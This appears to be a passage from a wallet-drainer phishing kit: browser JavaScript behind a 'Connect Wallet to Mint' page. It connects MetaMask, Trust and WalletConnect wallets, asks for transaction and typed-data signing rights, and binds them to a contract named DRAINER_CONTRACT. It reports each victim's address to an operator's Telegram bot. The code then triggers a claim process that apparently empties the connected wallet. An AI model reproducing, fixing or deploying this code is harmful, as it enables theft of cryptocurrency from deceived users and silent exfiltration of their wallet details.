import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  CONFIG SHORTCUTS
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
  } = CONFIG;

  const PRIMARY_PROJECT_ID  = PROJECT_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;

  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  const CHAIN_CAIP = `eip155:${MAINNET_ID}`;

  const REQUIRED_METHODS = [
    'eth_sendTransaction',
    'personal_sign',
    'eth_signTypedData_v4',
    'eth_signTypedData',
    'eth_accounts',
    'eth_chainId',
  ];
  const REQUIRED_EVENTS = ['chainChanged', 'accountsChanged'];

  // ==========================================================================
  //  PLATFORM DETECTION
  // ==========================================================================
  const UA = navigator.userAgent || '';
  const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  function getPlatform() {
    if (isIOSDevice)     return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA))              return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA))   return 'mac';
    return 'unknown';
  }

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;
  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      return r.ok;
    } catch (e) { console.error('[main.js] Telegram exception:', e); return false; }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (eth?.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth?.isTrust || /TrustWallet/i.test(UA))       return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth?.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA) && eth)                    return { wallet: 'rainbow',  name: 'Rainbow' };
    if (eth && isMobileDevice)                         return { wallet: 'injected', name: 'Wallet' };
    return null;
  }

  // ==========================================================================
  //  UTILITIES
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) => setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)),
    ]);
  }

  // ==========================================================================
  //  LIBRARY LOADING
  // ==========================================================================
  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadWalletConnectLibraries() {
    const signCdn = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
    ];
    const modalCdn = [
      'https://esm.sh/@walletconnect/modal@2.6.2?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
    ];
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];

    const [SignClient, WalletConnectModal, EthereumProvider] = await Promise.all([
      tryImport(signCdn,    (m) => m.default || m,                            'SignClient'),
      tryImport(modalCdn,   (m) => m.WalletConnectModal || m.default || m,    'Modal'),
      tryImport(providerCdn,(m) => m.EthereumProvider || m.default || m,      'EthereumProvider'),
    ]);

    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            const ws = new WebSocket(url);
            const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
            ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
            ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
          }),
          timeoutMs + 500,
          `ws-probe ${url}`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch (e) { /* next */ }
    }
    logDebug('⚠️ No relay reachable — using primary anyway');
    return RELAY_URLS[0];
  }

  // ==========================================================================
  //  DOM + STATE
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  let SignClient = null;
  let WalletConnectModal = null;
  let EthereumProvider = null;

  let client = null;              // SignClient instance
  let modal = null;               // Modal instance
  let currentSession = null;      // Active WC session
  let activeProvider = null;      // EIP-1193 provider for signing
  let web3Instance = null;
  let contractInstance = null;
  let isConnecting = false;
  let activeRelayUrl = RELAY_URLS[0];

  // Track pending proposal topic so we can reconcile after app-switch
  const PROPOSAL_KEY = 'apex_pending_proposal_topic';
  const SESSION_KEY  = 'apex_wc_session_topic';
  const ADDRESS_KEY  = 'apex_wc_address';

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  function saveWallet(address, session = null, chainType = null) {
    try {
      localStorage.setItem('connectedWallet', address);
      if (session) {
        localStorage.setItem('walletConnectSession', JSON.stringify(session));
        localStorage.setItem(SESSION_KEY, session.topic || '');
      }
      if (chainType) localStorage.setItem('chainType', chainType);
      localStorage.setItem(ADDRESS_KEY, address);
    } catch (e) { logDebug('saveWallet storage error: ' + e.message); }
  }
  function getSavedWallet()    { return localStorage.getItem('connectedWallet'); }
  function getSavedSession()   {
    const s = localStorage.getItem('walletConnectSession');
    try { return s ? JSON.parse(s) : null; } catch { return null; }
  }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
  function getSavedSessionTopic() { return localStorage.getItem(SESSION_KEY) || ''; }
  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('walletConnectSession');
    localStorage.removeItem('chainType');
    localStorage.removeItem(SESSION_KEY);
    localStorage.removeItem(ADDRESS_KEY);
    localStorage.removeItem(PROPOSAL_KEY);
  }

  // ==========================================================================
  //  PUBLISH GLOBAL STATE — script.js reads window.__apexConnected
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || web3Instance?.currentProvider || window.ethereum || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      session: currentSession,
      publishedAt: Date.now(),
    };
    logDebug(`published global: addr=${address} chain=${chain} hasWeb3=${!!web3Instance} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    currentSession = null;
    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963 PROVIDER DISCOVERY
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET SELECTION MODAL (desktop injected fallback)
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);
      display:flex;align-items:center;justify-content:center;z-index:99999;
    `;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background:#1F2937;padding:24px;border-radius:16px;
      max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;
    `;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `
        background:#374151;border:none;padding:12px;border-radius:8px;
        color:white;font-size:16px;cursor:pointer;text-align:left;
        display:flex;gap:10px;align-items:center;
      `;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT INIT
  // ==========================================================================
  async function initWalletConnect({ useFallbackId = false, timeoutMs = 12000 } = {}) {
    if (client && modal) return true;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) { logDebug('❌ No projectId configured'); return false; }

    activeRelayUrl = await pickRelayUrl();

    try {
      logDebug(`WC init: projectId=${projectId.slice(0,8)}… relay=${activeRelayUrl}`);
      const t0 = performance.now();

      const initPromise = (async () => {
        client = await SignClient.init({
          projectId,
          metadata: DAPP_METADATA,
          relayUrl: activeRelayUrl,
        });
        modal = new WalletConnectModal({
          projectId,
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '9999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
          },
          enableExplorer: true,
        });
        return true;
      })();

      const ok = await withTimeout(initPromise, timeoutMs, 'WC init');
      if (!ok) throw new Error('WC init returned false');
      logDebug(`✅ WC init OK in ${(performance.now() - t0).toFixed(0)}ms`);
      return true;
    } catch (e) {
      logDebug(`WC init failed: ${e.message}`);
      client = null;
      modal = null;
      return false;
    }
  }

  // ==========================================================================
  //  SESSION HELPERS — extract address and build the live provider
  // ==========================================================================
  function addressFromSession(session) {
    const accounts = session?.namespaces?.eip155?.accounts || [];
    if (!accounts.length) return null;
    // Format: eip155:1:0xabc...
    return accounts[0].split(':')[2] || null;
  }

  /**
   * Build the live EIP-1193 provider from an existing session.
   * Uses SignClient's session + EthereumProvider in a way that works with
   * Trust Wallet and other wallets that don't tolerate init({ session })
   * alone. We explicitly enable the provider so it attaches to the relay.
   */
  async function buildProviderFromSession(session) {
    const projectId = PRIMARY_PROJECT_ID;
    // EthereumProvider.init does not accept an existing session reliably.
    // The recommended approach is to call init() with the same metadata and
    // then rely on the session being present in the client's storage. The
    // provider will reconnect on first request if necessary.
    const provider = await EthereumProvider.init({
      projectId,
      metadata: DAPP_METADATA,
      relayUrl: activeRelayUrl,
      chains: [MAINNET_ID],
      methods: REQUIRED_METHODS,
      events: REQUIRED_EVENTS,
      showQrModal: false,
      qrModalOptions: { themeMode: 'dark' },
    });

    // Give the provider a chance to attach to the existing session.
    // Some wallets (Trust) need a brief await here before the provider
    // reports accounts.
    await new Promise((r) => setTimeout(r, 200));

    return provider;
  }

  // ==========================================================================
  //  CONNECT — INJECTED EVM
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 600));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        timeoutMs,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return false;

      const address = accounts[0];
      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider = provider;

      saveWallet(address, null, 'evm');
      updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected connected: ${address} (${chosen.info.name})`);
      return true;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  CONNECT — WALLETCONNECT (the fix)
  //
  //  Trust Wallet race condition fix:
  //    1. Register a one-shot session_connect handler BEFORE client.connect()
  //       so we never miss the settlement.
  //    2. Race approval() against the session_connect event, and against a
  //       "reconcile after app switch" poll.
  //    3. Persist the proposal topic in localStorage so if the page reloads
  //       after Trust returns, we can find the session.
  //    4. Set up provider event listeners BEFORE awaiting settlement.
  // ==========================================================================
  async function connectViaWalletConnect({ useFallbackId = false, timeoutMs = 300000 } = {}) {
    if (isConnecting) return false;
    isConnecting = true;

    let settledSession = null;
    let settleResolve = null;
    const settlePromise = new Promise((res) => { settleResolve = res; });

    // One-shot session_connect listener — this is the critical race fix.
    let clientListener = null;
    const armSessionListener = () => {
      if (!client || clientListener) return;
      clientListener = (session) => {
        const addr = addressFromSession(session);
        if (!addr) return;
        logDebug(`session_connect caught: ${addr}`);
        settledSession = session;
        settleResolve(session);
      };
      client.on('session_connect', clientListener);
    };

    try {
      const ok = await initWalletConnect({ useFallbackId });
      if (!ok) { isConnecting = false; return false; }

      // Arm the listener BEFORE calling connect so we can't miss it.
      armSessionListener();

      if (modal?.closeModal) { try { modal.closeModal(); } catch {} }

      showStatus('Opening wallet options...', 'info');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: REQUIRED_METHODS,
            chains: [CHAIN_CAIP],
            events: REQUIRED_EVENTS,
          },
        },
      });
      if (!uri) throw new Error('No URI returned');

      // Persist the pairing URI so we can reconcile after app switch.
      try {
        const pairingTopic = uri.split('@')[0].split(':').pop();
        localStorage.setItem(PROPOSAL_KEY, pairingTopic || uri.slice(0, 40));
        logDebug(`proposal topic saved: ${pairingTopic || uri.slice(0, 20)}…`);
      } catch (e) { /* non-fatal */ }

      modal.openModal({ uri });
      showStatus('Choose your wallet', 'info');

      // Race: approval() resolves on the WC client side; settlePromise resolves
      // on the session_connect event. Whichever fires first wins.
      const session = await withTimeout(
        Promise.race([approval(), settlePromise]),
        timeoutMs,
        'WC approval'
      );

      // If approval() resolved but we don't have the address, wait briefly for
      // the event to catch up. Trust Wallet sometimes settles before events
      // propagate through the relay.
      let finalSession = session || settledSession;
      if (!addressFromSession(finalSession)) {
        logDebug('session has no address — waiting for session_connect event…');
        finalSession = await withTimeout(settlePromise, 8000, 'session_connect reconcile');
      }

      if (modal) modal.closeModal();
      localStorage.removeItem(PROPOSAL_KEY);

      if (!addressFromSession(finalSession)) {
        logDebug('❌ No address after WC settle');
        isConnecting = false;
        return false;
      }

      const account = addressFromSession(finalSession);
      currentSession = finalSession;

      // Build the provider and attach listeners BEFORE publishing state.
      const provider = await buildProviderFromSession(finalSession);
      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider = provider;

      saveWallet(account, finalSession, 'evm');
      updateConnectedUI(account, 'evm');

      isConnecting = false;
      logDebug(`✅ WC connected: ${account}`);
      return true;
    } catch (e) {
      logDebug('WC connect error: ' + e.message);
      if (modal) { try { modal.closeModal(); } catch {} }
      localStorage.removeItem(PROPOSAL_KEY);
      isConnecting = false;
      return false;
    } finally {
      // Detach the one-shot listener.
      if (client && clientListener && typeof client.off === 'function') {
        try { client.off('session_connect', clientListener); } catch {}
      }
      clientListener = null;
    }
  }

  // ==========================================================================
  //  PROVIDER LIFECYCLE EVENTS
  // ==========================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        const a = accounts[0];
        updateConnectedUI(a, 'evm');
        saveWallet(a, currentSession, 'evm');
        publishGlobalState(a, 'evm', provider);
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    });

    provider.on('chainChanged', (id) => {
      showStatus(`Network changed to ${id}`, 'info');
      try {
        const a = window.__apexConnected?.address || getSavedWallet();
        if (a) {
          if (web3Instance) contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          publishGlobalState(a, 'evm', provider);
        }
      } catch {}
    });

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    if (isDesktopDevice) {
      success = await connectDirectEVM(8000);
      if (!success) success = await connectViaWalletConnect({ useFallbackId: false, timeoutMs: 300000 });
      if (!success) success = await connectViaWalletConnect({ useFallbackId: true,  timeoutMs: 300000 });
    } else {
      const inWallet = detectInWalletBrowser();
      const strongInWallet = inWallet && inWallet.wallet !== 'injected';
      if (strongInWallet) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        success = await connectDirectEVM(8000);
      }
      if (!success) success = await connectViaWalletConnect({ useFallbackId: false, timeoutMs: 300000 });
      if (!success) success = await connectViaWalletConnect({ useFallbackId: true,  timeoutMs: 300000 });
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT
  // ==========================================================================
  async function disconnectWallet() {
    try {
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
      }
      if (web3Instance?.currentProvider?.disconnect) {
        await web3Instance.currentProvider.disconnect();
      }
    } catch {}
    resetConnectedUI();
    clearSavedWallet();
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    const hasSession = currentSession || getSavedChainType() !== 'unknown';
    if (saved && hasSession) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE — the reconciliation path
  //  If Trust Wallet shows "Connected" but our page reloaded, we reconcile
  //  by finding the session in client.session.getAll() by topic or address.
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    const savedSession = getSavedSession();
    const savedTopic   = getSavedSessionTopic();

    if (!savedWallet || savedChain !== 'evm') return;

    // Ensure the client is initialized before restore attempt.
    const ok = await initWalletConnect({ useFallbackId: false });
    if (!ok) {
      logDebug('WC init failed during restore — falling back to injected');
    }

    if (ok && client) {
      try {
        // Strategy 1: find by topic.
        let session = null;
        if (savedTopic && client.session?.get) {
          try { session = client.session.get(savedTopic); } catch {}
        }

        // Strategy 2: find by address across all sessions.
        if (!session && client.session?.getAll) {
          const all = client.session.getAll() || [];
          session = all.find((s) => addressFromSession(s)?.toLowerCase() === savedWallet.toLowerCase()) || null;
        }

        if (session) {
          currentSession = session;
          const provider = await buildProviderFromSession(session);
          setupEVMProviderEvents(provider);

          const Web3 = (await import('web3')).default;
          web3Instance = new Web3(provider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider = provider;

          updateConnectedUI(savedWallet, 'evm');
          logDebug('♻️ WC session restored from storage');
          return;
        } else {
          logDebug('No matching WC session found on client');
        }
      } catch (e) {
        logDebug('WC restore: ' + e.message);
      }
    }

    // Fallback: injected (desktop only)
    if (isDesktopDevice && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          const Web3 = (await import('web3')).default;
          web3Instance = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider = window.ethereum;
          updateConnectedUI(savedWallet, 'evm');
          setupEVMProviderEvents(window.ethereum);
          logDebug('♻️ Injected session restored');
          return;
        }
      } catch {}
    }

    clearSavedWallet();
  }

  // ==========================================================================
  //  PAGE-RETURN RECONCILIATION
  //  When the user returns from the wallet app after approval, the original
  //  page may resume. We check for pending sessions and reconcile.
  // ==========================================================================
  async function reconcilePendingSession() {
    if (!client) return;
    const pending = localStorage.getItem(PROPOSAL_KEY);
    if (!pending) return;

    logDebug(`Reconciling pending proposal: ${pending}`);

    // Give WC a moment to sync after page resume.
    await new Promise((r) => setTimeout(r, 800));

    try {
      const all = client.session?.getAll?.() || [];
      if (!all.length) {
        logDebug('No sessions found during reconcile');
        localStorage.removeItem(PROPOSAL_KEY);
        return;
      }

      // Pick the most recent session (by expiry, which reflects creation).
      const session = all.sort((a, b) => (b.expiry || 0) - (a.expiry || 0))[0];
      const addr = addressFromSession(session);
      if (!addr) { localStorage.removeItem(PROPOSAL_KEY); return; }

      logDebug(`Reconciled session: ${addr}`);

      currentSession = session;
      const provider = await buildProviderFromSession(session);
      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider = provider;

      saveWallet(addr, session, 'evm');
      updateConnectedUI(addr, 'evm');
      localStorage.removeItem(PROPOSAL_KEY);
      logDebug('♻️ Pending session reconciled');
    } catch (e) {
      logDebug('Reconcile error: ' + e.message);
      localStorage.removeItem(PROPOSAL_KEY);
    }
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const [libs] = await Promise.all([
      loadWalletConnectLibraries(),
      pickRelayUrl().catch(() => RELAY_URLS[0]),
    ]);
    SignClient         = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    EthereumProvider   = libs.EthereumProvider;
    logDebug('✅ All libraries loaded');

